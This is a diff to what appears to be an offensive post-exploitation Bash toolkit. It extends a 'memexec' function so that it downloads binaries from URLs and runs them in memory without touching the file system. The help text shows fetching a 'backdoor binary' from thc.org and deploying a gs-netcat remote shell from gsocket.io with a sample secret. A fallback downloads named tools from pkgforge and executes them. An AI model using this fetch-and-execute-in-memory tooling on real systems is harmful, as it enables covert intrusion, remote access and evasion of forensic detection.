@@ -105,11 +105,12 @@ file-system to deploy your binary/backdoor.
 
 Examples:
 1. ${CDC}cat /usr/bin/id | memexec -u${CN}
-2. ${CDC}curl -SsfL https://thc.org/my-backdoor-binary | memexec${CN}
+2. ${CDC}memexec https://thc.org/my-backdoor-binary${CN}
+3. ${CDC}memexec nmap${CN}
 
 Or a real world example to deploy gsocket without touching the file system
 or /dev/shm or /tmp (Change the -sSECRET please):
-${CDC}GS_ARGS=\"-ilqD -sSecretChangeMe31337\" memexec <(curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-\$(uname -m))${CN}"
+${CDC}GS_ARGS=\"-ilD -sSecretChangeMe31337\" memexec https://gsocket.io/bin/gs-netcat_mini-linux-\$(uname -m)${CN}"
 }
 
 xhelp_bounce() {
@@ -1556,16 +1557,37 @@ _memexec() {
 # memexec /bin/sh -c "echo hi"
 # memexec -c "echo hi" </bin/sh
 # GS_ARGS="-ilqD -s 5sLosWHZLpE9riqt74KvG9" memexec gs-netcat
+# memexec https://gsocket.io/bin/gs-netcat
 memexec() {
     local fn
     local prg="$1"
 
-    [ ! -t 0 ] && { _memexec "" "$@"; return $?; }
+    # cat /usr/bin/id | memexec -u
+    [ ! -t 0 ] && {
+        _memexec "" "$@"
+        return
+    }
 
+    [ $# -le 0 ] && { xhelp_memexec; return 255; }
     shift
-    fn="$(which "$prg" 2>/dev/null)" && { _memexec "${prg}" "$@" <"$fn"; return $?; }
+
+    # memexec <URL> <command line options>
+    [[ "$prg" =~ ^(https|http|ftp):// ]] && {
+        dl "$prg" | _memexec "" "$@"
+        return
+    }
+    # memexec id -u
+    fn="$(which "$prg" 2>/dev/null)" && {
+        _memexec "${prg}" "$@" <"$fn"
+        return
+    }
+    
+    # Check if $prg contains a "/" and return (do not download)
     [ "$prg" != "${prg##*/}" ] && { echo >&2 "Command not found: $prg"; return 255; }
-    dl "https://bin.pkgforge.dev/${HS_ARCH}/${prg}" | { _memexec "${prg}" "$@"; return $?; }
+
+    # Download binary from pkgforge
+    dl "https://bin.pkgforge.dev/${HS_ARCH}/${prg}" | _memexec "${prg}" "$@"
+    return
 }
 
 mx() { memexec "$@"; }
@@ -1620,7 +1642,7 @@ hs_init_dl() {
         dl() { 
             local opts=()
             [ -n "$UNSAFE" ] && opts=("-k")
-            curl -fsSL "${opts[@]}" --connect-timeout 7 --retry 3 "${1:?}"
+            curl -fsSL "${opts[@]}" --connect-timeout 7 --retry 2 "${1:?}"
         }
     elif which wget &>/dev/null; then
         _HS_SSL_ERR="is not trusted"
